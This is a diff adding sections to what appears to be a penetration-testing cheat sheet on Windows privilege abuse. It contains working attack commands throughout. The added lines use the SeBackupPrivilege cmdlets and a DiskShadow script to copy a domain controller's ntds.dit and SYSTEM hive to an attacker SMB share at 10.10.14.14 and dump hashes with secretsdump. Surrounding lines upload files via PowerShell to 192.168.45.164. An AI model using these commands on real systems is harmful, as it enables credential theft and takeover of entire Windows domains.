@@ -286,6 +286,40 @@ powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.
 
 powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\system.bak')"
 </code></pre>
+<h3 id="copy-filesebackupprivilege"><a class="header" href="#copy-filesebackupprivilege">### Copy-FileSeBackupPrivilege</a></h3>
+<p>https://github.com/giuliano108/SeBackupPrivilege</p>
+<pre><code>One way to read and copy files:
+
+upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
+upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
+import-module .\SeBackupPrivilegeCmdLets.dll
+import-module .\SeBackupPrivilegeUtils.dll
+Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns
+type \programdata\netlogon.dns
+
+</code></pre>
+<h3 id="diskshadow"><a class="header" href="#diskshadow">### DiskShadow</a></h3>
+<pre><code>put this into a file called vss.dsh:
+
+set context persistent nowriters 
+set metadata c:\programdata\df.cab 
+set verbose on 
+add volume c: alias df 
+create expose %df% z:
+
+
+---
+unix2dos vss.dsh
+upload vss.dsh c:\programdata\vss.dsh
+diskshadow /s c:\programdata\vss.dsh
+
+smbserver.py s . -smb2support -username df -password df
+net use \\10.10.14.14\s /u:df df
+Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.14\s\ntds.dit
+reg.exe save hklm\system \\10.10.14.14\system
+secretsdump.py -system system -ntds ntds.dit LOCAL
+
+</code></pre>
 <h3 id="ticket-generation-from-linux"><a class="header" href="#ticket-generation-from-linux">Ticket generation from Linux</a></h3>
 <pre><code># Generate a ticket or convert it (kekeo) to ccache format
 ticketer.py -nthash &lt;hash&gt; -domain-sid &lt;sid&gt; -domain &lt;domain&gt; &lt;user&gt;
